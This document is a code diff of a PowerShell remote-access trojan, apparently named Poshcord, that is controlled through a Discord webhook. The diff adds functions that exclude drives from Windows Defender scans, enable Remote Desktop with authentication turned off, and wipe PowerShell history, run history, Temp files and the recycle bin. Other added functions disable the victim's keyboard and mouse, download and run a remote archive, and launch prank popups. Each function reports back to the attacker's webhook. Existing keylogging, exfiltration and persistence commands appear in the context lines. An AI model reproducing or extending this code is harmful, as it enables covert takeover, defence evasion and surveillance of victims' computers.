@@ -63,7 +63,6 @@ Function Options {
         "title" = "Discord C2 Options"
         "description" = @"
 ``````Commands List:``````
-- **Message**: Send a message window to the User (!user popup!)
 - **SpeechToText**: Send audio transcript to Discord
 - **Systeminfo**: Send System info as text file to Discord
 - **FolderTree**: Save folder trees to file and send to Discord
@@ -73,7 +72,12 @@ Function Options {
 - **AddPersistance**: Add this script to startup.
 - **RemovePersistance**: Remove Poshcord from startup
 - **IsAdmin**: Check if the session is admin
-- **AttemptElevate**: Attempt to restart script as admin (!user popup!)
+- **Elevate**: Attempt to restart script as admin (!user popup!)
+- **ExcludeCDrive**: Exclude C:/ Drive from all Defender Scans
+- **ExcludeAllDrives**: Exclude C:/ - G:/ Drives from Defender Scans
+- **EnableRDP**: Enable Remote Desktop on target.
+- **EnableIO**: Enable Keyboard and Mouse
+- **DisableIO**: Disable Keyboard and Mouse
 
 - **RecordAudio**: Record microphone and send to Discord
 - **RecordScreen**: Record Screen and send to Discord
@@ -84,9 +88,23 @@ Function Options {
 - **Keycapture**: Capture Keystrokes and send to Discord
 
 - **FakeUpdate**: Spoof Windows-10 update screen using Chrome
+- **Windows93**: Start parody Windows93 using Chrome
+- **WindowsIdiot**: Start fake Windows95 using Chrome
 - **SendHydra**: Never ending popups (use killswitch) to stop
+- **SoundSpam**: Play all Windows default sounds on the target
+- **Message**: Send a message window to the User (!user popup!)
+- **VoiceMessage**: Send a message window to the User (!user popup!)
+- **MinimizeAll**: Send a voice message to the User
+- **EnableDarkMode**: Enable System wide Dark Mode
+- **DisableDarkMode**: Disable System wide Dark Mode\
+- **VolumeMax**: Maximise System Volume
+- **VolumeMin**: Minimise System Volume
+- **ShortcutBomb**: Create 50 shortcuts on the desktop.
+- **Wallpaper**: Set the wallpaper (wallpaper -url http://img.com/f4wc)
+- **Goose**: Spawn an annoying goose (Sam Pearson App)
 
 - **ExtraInfo**: Get a list of further info and command examples
+- **Cleanup**: Wipe history (run prompt, powershell, recycle bin, Temp)
 - **Kill**: Stop a running module (eg. Keycapture / Exfiltrate)
 - **Control-All**: Control all waiting sessions simultaneously
 - **Pause**: Pause the current authenticated session
@@ -127,8 +145,10 @@ Use 'FolderTree' command to show all files
 > PS> ``EnumerateLAN -Prefix 192.168.1.``
 This Eg. will scan 192.168.1.1 to 192.168.1.254
 
-**Message Example:**
+**Prank Examples:**
 > PS> ``Message 'Your Message Here!'``
+> PS> ``VoiceMessage 'Your Message Here!'``
+> PS> ``wallpaper -url http://img.com/f4wc``
 
 **Record Examples:**
 > PS> ``RecordAudio -t 100`` (number of seconds to record)
@@ -149,6 +169,17 @@ This Eg. will scan 192.168.1.1 to 192.168.1.254
     } | ConvertTo-Json
     
     Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $json
+}
+
+Function CleanUp { 
+
+    Remove-Item $env:temp\* -r -Force -ErrorAction SilentlyContinue
+    Remove-Item (Get-PSreadlineOption).HistorySavePath
+    reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+    Clear-RecycleBin -Force -ErrorAction SilentlyContinue
+    $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":white_check_mark: ``Clean Up Task Complete`` :white_check_mark:"} | ConvertTo-Json
+    Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+    
 }
 
 # --------------------------------------------------------------- INFO FUNCTIONS ------------------------------------------------------------------------
@@ -538,7 +569,6 @@ Remove-Item -Path $outpath -force
 Function FakeUpdate {
     $tobat = @'
 Set WshShell = WScript.CreateObject("WScript.Shell")
-WshShell.Run "C:\Windows\System32\scrnsave.scr"
 WshShell.Run "chrome.exe --new-window -kiosk https://fakeupdate.net/win8", 1, False
 WScript.Sleep 200
 WshShell.SendKeys "{F11}"
@@ -550,6 +580,40 @@ WshShell.SendKeys "{F11}"
     sleep 3
     Remove-Item -Path $pth -Force
     $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":arrows_counterclockwise: ``Fake-Update Sent..`` :arrows_counterclockwise:"} | ConvertTo-Json
+    Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+}
+
+Function Windows93 {
+    $tobat = @'
+Set WshShell = WScript.CreateObject("WScript.Shell")
+WshShell.Run "chrome.exe --new-window -kiosk https://windows93.net", 1, False
+WScript.Sleep 200
+WshShell.SendKeys "{F11}"
+'@
+    $pth = "$env:APPDATA\Microsoft\Windows\1021.vbs"
+    $tobat | Out-File -FilePath $pth -Force
+    sleep 1
+    Start-Process -FilePath $pth
+    sleep 3
+    Remove-Item -Path $pth -Force
+    $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":arrows_counterclockwise: ``Windows 93 Sent..`` :arrows_counterclockwise:"} | ConvertTo-Json
+    Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+}
+
+Function WindowsIdiot {
+    $tobat = @'
+Set WshShell = WScript.CreateObject("WScript.Shell")
+WshShell.Run "chrome.exe --new-window -kiosk https://ygev.github.io/Trojan.JS.YouAreAnIdiot", 1, False
+WScript.Sleep 200
+WshShell.SendKeys "{F11}"
+'@
+    $pth = "$env:APPDATA\Microsoft\Windows\1021.vbs"
+    $tobat | Out-File -FilePath $pth -Force
+    sleep 1
+    Start-Process -FilePath $pth
+    sleep 3
+    Remove-Item -Path $pth -Force
+    $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":arrows_counterclockwise: ``Windows Idiot Sent..`` :arrows_counterclockwise:"} | ConvertTo-Json
     Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
 }
 
@@ -591,6 +655,98 @@ Function Message([string]$Message){
     msg.exe * $Message
     $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":arrows_counterclockwise: ``Message Sent to User..`` :arrows_counterclockwise:"} | ConvertTo-Json
     Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+}
+
+Function SoundSpam {
+    param([Parameter()][int]$Interval = 3)
+        $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":white_check_mark: ``Spamming Sounds... Please wait..`` :white_check_mark:"} | ConvertTo-Json
+    irm -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+    Get-ChildItem C:\Windows\Media\ -File -Filter *.wav | Select-Object -ExpandProperty Name | Foreach-Object { Start-Sleep -Seconds $Interval; (New-Object Media.SoundPlayer "C:\WINDOWS\Media\$_").Play(); }
+    $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":white_check_mark: ``Sound Spam Complete!`` :white_check_mark:"} | ConvertTo-Json
+    irm -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+}
+
+Function VoiceMessage([string]$Message){
+    Add-Type -AssemblyName System.speech
+    $SpeechSynth = New-Object System.Speech.Synthesis.SpeechSynthesizer
+    $SpeechSynth.Speak($Message)
+    $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":white_check_mark: ``Message Sent!`` :white_check_mark:"} | ConvertTo-Json
+    irm -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+}
+
+Function MinimizeAll{
+    $apps = New-Object -ComObject Shell.Application
+    $apps.MinimizeAll()
+    $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":white_check_mark: ``Apps Minimised`` :white_check_mark:"} | ConvertTo-Json
+    irm -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+}
+
+Function EnableDarkMode {
+    $Theme = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize"
+    Set-ItemProperty $Theme AppsUseLightTheme -Value 0
+    Start-Sleep 1
+    $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":white_check_mark: ``Dark Mode Enabled`` :white_check_mark:"} | ConvertTo-Json
+    irm -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+}
+
+Function DisableDarkMode {
+    $Theme = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize"
+    Set-ItemProperty $Theme AppsUseLightTheme -Value 1
+    Start-Sleep 1
+    $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":octagonal_sign: ``Dark Mode Disabled`` :octagonal_sign:"} | ConvertTo-Json
+    Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+}
+
+Function VolumeMax {
+    Start-AudioControl
+    [audio]::Volume = 1
+}
+
+Function VolumeMin {
+    Start-AudioControl
+    [audio]::Volume = 0
+}
+
+Function ShortcutBomb {
+    $n = 0
+    while($n -lt 50) {
+        $num = Get-Random
+        $AppLocation = "C:\Windows\System32\rundll32.exe"
+        $WshShell = New-Object -ComObject WScript.Shell
+        $Shortcut = $WshShell.CreateShortcut("$Home\Desktop\USB Hardware" + $num + ".lnk")
+        $Shortcut.TargetPath = $AppLocation
+        $Shortcut.Arguments ="shell32.dll,Control_RunDLL hotplug.dll"
+        $Shortcut.IconLocation = "hotplug.dll,0"
+        $Shortcut.Description ="Device Removal"
+        $Shortcut.WorkingDirectory ="C:\Windows\System32"
+        $Shortcut.Save()
+        Start-Sleep 0.2
+        $n++
+    }
+    $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":white_check_mark: ``Shortcuts Created!`` :white_check_mark:"} | ConvertTo-Json
+    irm -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+}
+
+Function Wallpaper {
+param ([string[]]$url)
+$outputPath = "$env:temp\img.jpg";$wallpaperStyle = 2;IWR -Uri $url -OutFile $outputPath
+$signature = 'using System;using System.Runtime.InteropServices;public class Wallpaper {[DllImport("user32.dll", CharSet = CharSet.Auto)]public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);}'
+Add-Type -TypeDefinition $signature;$SPI_SETDESKWALLPAPER = 0x0014;$SPIF_UPDATEINIFILE = 0x01;$SPIF_SENDCHANGE = 0x02;[Wallpaper]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $outputPath, $SPIF_UPDATEINIFILE -bor $SPIF_SENDCHANGE)
+    $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":white_check_mark: ``New Wallpaper Set`` :white_check_mark:"} | ConvertTo-Json
+    irm -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+}
+
+Function Goose {
+    $url = "https://github.com/beigeworm/assets/raw/main/Goose.zip"
+    $tempFolder = $env:TMP
+    $zipFile = Join-Path -Path $tempFolder -ChildPath "Goose.zip"
+    $extractPath = Join-Path -Path $tempFolder -ChildPath "Goose"
+    Invoke-WebRequest -Uri $url -OutFile $zipFile
+    Expand-Archive -Path $zipFile -DestinationPath $extractPath
+    $vbscript = "$extractPath\Goose.vbs"
+    & $vbscript
+    $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":white_check_mark: ``Goose Spawned!`` :white_check_mark:"} | ConvertTo-Json
+    irm -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys    
 }
 
 # --------------------------------------------------------------- PERSISTANCE FUNCTIONS ------------------------------------------------------------------------
@@ -870,7 +1026,7 @@ Function IsAdmin{
     }
 }
 
-Function AttemptElevate{
+Function Elevate{
     $tobat = @"
 Set WshShell = WScript.CreateObject(`"WScript.Shell`")
 WScript.Sleep 200
@@ -888,12 +1044,54 @@ WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -C `$tk='$token'; `$ch='$cha
         Sleep 7
         rm -Path $pth
         $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":white_check_mark: ``UAC Prompt sent to the current user..`` :white_check_mark:"} | ConvertTo-Json
-        Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+        irm -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
         exit
     }
     catch{
     Write-Host "FAILED"
     }
+}
+
+Function ExcludeCDrive {
+    Add-MpPreference -ExclusionPath C:\
+    $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":white_check_mark: ``C:/ Drive Excluded`` :white_check_mark:"} | ConvertTo-Json
+    irm -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+}
+
+Function ExcludeALLDrives {
+    Add-MpPreference -ExclusionPath C:\
+    Add-MpPreference -ExclusionPath D:\
+    Add-MpPreference -ExclusionPath E:\
+    Add-MpPreference -ExclusionPath F:\
+    Add-MpPreference -ExclusionPath G:\
+    $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":white_check_mark: ``All Drives C:/ - G:/ Excluded`` :white_check_mark:"} | ConvertTo-Json
+    irm -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+}
+
+Function EnableRDP {
+    Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0
+    Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+    Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 0
+    $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":white_check_mark: ``RDP Enabled`` :white_check_mark:"} | ConvertTo-Json
+    irm -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+}
+
+Function EnableIO{
+$PNPMice = Get-WmiObject Win32_USBControllerDevice | %{[wmi]$_.dependent} | ?{$_.pnpclass -eq 'Mouse'}
+$PNPMice.Enable()
+$PNPKeyboard = Get-WmiObject Win32_USBControllerDevice | %{[wmi]$_.dependent} | ?{$_.pnpclass -eq 'Keyboard'}
+$PNPKeyboard.Enable()
+    $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":white_check_mark: ``IO Enabled`` :white_check_mark:"} | ConvertTo-Json
+    Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+}
+
+Function DisableIO{
+$PNPMice = Get-WmiObject Win32_USBControllerDevice | %{[wmi]$_.dependent} | ?{$_.pnpclass -eq 'Mouse'}
+$PNPMice.Disable()
+$PNPKeyboard = Get-WmiObject Win32_USBControllerDevice | %{[wmi]$_.dependent} | ?{$_.pnpclass -eq 'Keyboard'}
+$PNPKeyboard.Disable()
+    $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":octagonal_sign: ``IO Disabled`` :octagonal_sign:"} | ConvertTo-Json
+    Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
 }
 
 # =============================================================== MAIN FUNCTIONS =========================================================================
@@ -935,8 +1133,7 @@ $jsonPayload = @{
 Try : ``options`` for a list of commands
 Try : ``extrainfo`` for command exapmples
 Use : ``pause`` to pause the session on the target
-Use : ``close`` to stop the session on the target
-     
+Use : ``close`` to stop the session on the target    
 "@
             color       = 16711680
             author      = @{
@@ -1033,13 +1230,11 @@ WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -W H -C `$tk='$token'; `$ch=
 }
 
 Function Authenticate{
-
     if (($response -like "$env:COMPUTERNAME") -or ($response -like "Control-All")) {
         Write-Host "Authenticated $env:COMPUTERNAME"
         $script:authenticated = 1
         $script:previouscmd = $response
         ConnectMsg
-    
     }
     else{
         Write-Host "$env:COMPUTERNAME Not authenticated"
